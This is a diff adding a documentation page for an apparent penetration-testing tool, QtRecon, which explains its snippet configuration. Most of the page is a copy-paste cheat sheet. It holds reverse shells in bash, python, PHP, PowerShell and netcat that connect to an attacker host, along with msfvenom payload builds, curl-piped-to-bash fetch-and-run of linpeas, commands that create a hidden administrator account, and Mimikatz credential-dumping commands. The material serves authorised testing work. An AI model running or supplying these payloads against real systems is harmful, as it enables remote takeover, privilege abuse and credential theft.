@@ -1,0 +1,271 @@
+---
+title: Snippets
+description: Code snippets and command cheatsheets with variable substitution
+---
+
+QtRecon includes a comprehensive snippet system for storing frequently-used commands, reverse shell payloads, and penetration testing cheatsheets.
+
+## Snippet structure
+
+Snippets are organized hierarchically in the configuration file:
+
+```json conf.json
+"snippets": {
+  "Reverse shells": [
+    "Launching the reverse shell",
+    [
+      "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
+    ],
+    "Bash TCP",
+    [
+      "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1",
+      "0<&196;exec 196<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%; sh <&196 >&196 2>&196"
+    ]
+  ]
+}
+```
+
+### Hierarchy format
+
+Snippets follow a nested array structure:
+
+<Steps>
+  <Step title="Category">
+    Top-level key defines the snippet category (e.g., `"Reverse shells"`, `"Linux"`, `"Windows"`)
+  </Step>
+  
+  <Step title="Section title">
+    String entry defines a section within the category
+  </Step>
+  
+  <Step title="Commands">
+    Array following a section title contains the actual commands
+  </Step>
+  
+  <Step title="Nested sections">
+    Sections can be nested by including `["Section name", [commands]]` within command arrays
+  </Step>
+</Steps>
+
+## LHOST and LPORT variables
+
+Snippets support automatic variable replacement for your attacking machine's IP and port:
+
+<ParamField path="%%%LHOST%%%" type="string">
+  Replaced with your local IP address based on `preferred_interfaces` configuration
+</ParamField>
+
+<ParamField path="%%%LPORT%%%" type="string">
+  Replaced with the value from `preferred_lport` configuration
+</ParamField>
+
+```json conf.json
+"user_prefs": {
+  "preferred_interfaces": ["tun0", "vpn0", "eth0"],
+  "preferred_lport": 8444
+}
+```
+
+### Variable replacement logic
+
+```python core/view.py
+section = section.replace("%%%LHOST%%%", self.ui.ui.lhost.text())
+section = section.replace("%%%LPORT%%%", self.ui.ui.lport.text())
+tab = tab.replace("%%%LHOST%%%", self.ui.ui.lhost.text())
+tab = tab.replace("%%%LPORT%%%", self.ui.ui.lport.text())
+```
+
+<Tip>
+  QtRecon automatically detects your IP from the first available interface in your `preferred_interfaces` list.
+</Tip>
+
+## Reverse shells
+
+The default configuration includes extensive reverse shell payloads:
+
+### Listener setup
+
+```json conf.json
+"Launching the reverse shell",
+[
+  "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
+]
+```
+
+### Bash reverse shells
+
+```json conf.json
+"Bash TCP",
+[
+  "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1",
+  "0<&196;exec 196<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%; sh <&196 >&196 2>&196",
+  "/bin/bash -l > /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0<&1 2>&1"
+]
+```
+
+### Python reverse shells
+
+```json conf.json
+"python",
+[
+  "IPv4",
+  [
+    "export RHOST=\"%%%LHOST%%%\";export RPORT=%%%LPORT%%%;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+    "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+  ]
+]
+```
+
+### PHP reverse shells
+
+```json conf.json
+"PHP",
+[
+  "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+  "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+  "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);`/bin/sh -i <&3 >&3 2>&3`;'"
+]
+```
+
+## Msfvenom payloads
+
+QtRecon includes comprehensive msfvenom payload generation commands:
+
+```json conf.json
+"Msfvenom",
+[
+  "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f exe > reverse.exe",
+  "msfvenom -p windows/shell_reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f exe > reverse.exe",
+  "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f elf >reverse.elf",
+  "msfvenom -p linux/x86/shell_reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f elf >reverse.elf",
+  "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"%%%LHOST%%%\" LPORT=%%%LPORT%%% -f war > shell.war",
+  "msfvenom -p php/meterpreter_reverse_tcp LHOST=\"%%%LHOST%%%\" LPORT=%%%LPORT%%% -f raw > shell.php"
+]
+```
+
+## Platform-specific cheatsheets
+
+Organize snippets by operating system:
+
+### Linux snippets
+
+```json conf.json
+"Linux": [
+  "Get file from HTTP server",
+  [
+    "sudo python -m http.server 80 --directory /usr/share/linux-binaries/PEASS-ng/linPEAS/",
+    "cd /tmp/; wget http://%%%LHOST%%%/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh",
+    "curl http://%%%LHOST%%%/linpeas.sh | bash"
+  ],
+  "Upgrade shell with a tty",
+  [
+    "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+  ]
+]
+```
+
+### Windows snippets
+
+```json conf.json
+"Windows": [
+  "Copy files from SMB",
+  [
+    "sudo smbserver.py -smb2support share /usr/share/windows-binaries/priv-esc",
+    "copy \\\\%%%LHOST%%%\\share\\seatbelt.exe seatbelt.exe"
+  ],
+  "Copy files from HTTP",
+  [
+    "sudo python -m http.server 80",
+    "powershell -c wget http://%%%LHOST%%%/seatbelt.exe -OutFile seatbelt.exe"
+  ],
+  "Add user into administrators group",
+  [
+    "net user hacker Password01 /add",
+    "net localgroup administrators hacker /add"
+  ]
+]
+```
+
+## Nested sections
+
+Create deeply nested snippet hierarchies:
+
+```json conf.json
+"Reverse SSH (https://github.com/Fahrj/reverse-ssh)",
+[
+  "Bind SSH",
+  [
+    "victim$ ./reverse-ssh",
+    "attacker$ ssh -p 31337 <RHOST> #(default password: letmeinbrudipls)"
+  ],
+  "Reverse SSH",
+  [
+    "attacker$ ./reverse-ssh -v -N -l :%%%LPORT%%%",
+    "victim$ ./reverse-ssh -p %%%LPORT%%% -b 8888 %%%LHOST%%%",
+    "attacker$ ssh -o UserKnownHostsFile=/dev/null -p 8888 127.0.0.1"
+  ]
+]
+```
+
+## Powershell reverse shells
+
+```json conf.json
+"Powershell",
+[
+  "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%%%LHOST%%%\",%%%LPORT%%%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+]
+```
+
+## Netcat variants
+
+```json conf.json
+"Netcat Traditional",
+[
+  "nc -e /bin/sh %%%LHOST%%% %%%LPORT%%%",
+  "nc -e /bin/bash %%%LHOST%%% %%%LPORT%%%",
+  "nc -c bash %%%LHOST%%% %%%LPORT%%%"
+],
+"Netcat OpenBsd",
+[
+  "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %%%LHOST%%% %%%LPORT%%% >/tmp/f"
+],
+"Netcat BusyBox",
+[
+  "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %%%LHOST%%% %%%LPORT%%% >/tmp/f"
+]
+```
+
+## Mimikatz commands
+
+```json conf.json
+"Mimikatz",
+[
+  "log",
+  "privilege::debug",
+  "sekurlsa::logonpasswords",
+  "ts::logonpasswords",
+  "ts::mstsc",
+  "token::elevate",
+  "lsadump::secrets",
+  "lsadump::sam"
+]
+```
+
+<Note>
+  Snippets are accessible through the QtRecon interface for quick copy-paste during assessments.
+</Note>
+
+## Credits and attribution
+
+Include attribution for snippet sources:
+
+```json conf.json
+"Credits",
+[
+  "PayloadsAllTheThings, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+]
+```
+
+<Tip>
+  Extend the snippets section with your own frequently-used commands, tools, and workflows. The hierarchical structure supports unlimited nesting levels.
+</Tip>
